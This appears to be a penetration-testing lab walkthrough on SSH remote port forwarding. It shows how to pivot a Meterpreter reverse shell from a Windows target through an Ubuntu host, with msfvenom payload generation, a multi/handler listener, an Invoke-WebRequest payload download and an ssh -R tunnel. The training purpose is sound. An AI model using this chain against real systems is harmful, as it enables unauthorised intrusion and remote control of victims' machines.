
SSH can forward traffic in different ways. We've seen:

- **Local Forwarding:** Make a remote service (on the target) appear on your local machine.
- **Dynamic Forwarding:** Use the target as a proxy to scan an entire network.

But there's a third way: **Remote Forwarding**.

**The Scenario:**  
You can RDP into a Windows machine ("Windows A") through an Ubuntu server. Now, you want to run a tool (like a malware payload) on your _local_ machine and make it accessible to "Windows A" as if it were on its own network.

**Remote Forwarding does this.** It takes a service on your local machine and forwards it to the _remote_ network, making it reachable by other hosts there.

The Windows server on the `172.16.5.0/23` network can only initiate connections to other hosts _within its own network_. To receive a reverse shell on our attack host, we need a **pivot host**—a machine that is accessible to both us and the target.

In our example, the **Ubuntu server is the perfect pivot host** because it can be reached by:

1. **Our attack host** (via its public IP), and
2. **The Windows target** (via the internal `172.16.5.0/23` network).

#### Creating a Windows Payload with msfvenom

	AstraX01@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

#### Configuring & Starting the multi/handler

	msf6 > use exploit/multi/handler

	[*] Using configured payload generic/shell_reverse_tcp 
	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
	payload => windows/x64/meterpreter/reverse_https 
	msf6 exploit(multi/handler) > set lhost 0.0.0.0 
	lhost => 0.0.0.0 
	msf6 exploit(multi/handler) > set lport 8000 
	lport => 8000 
	msf6 exploit(multi/handler) > run 
	
	[*] Started HTTPS reverse handler on https://0.0.0.0:8000

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.

#### Transferring Payload to Pivot Host

	AstraX01@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

#### Starting Python3 Webserver on Pivot Host

	ubuntu@Webserver$ python3 -m http.server 8123

#### Downloading Payload on the Windows Target

We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.

	PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

#### Using SSH -R

Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

	AstraX01@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

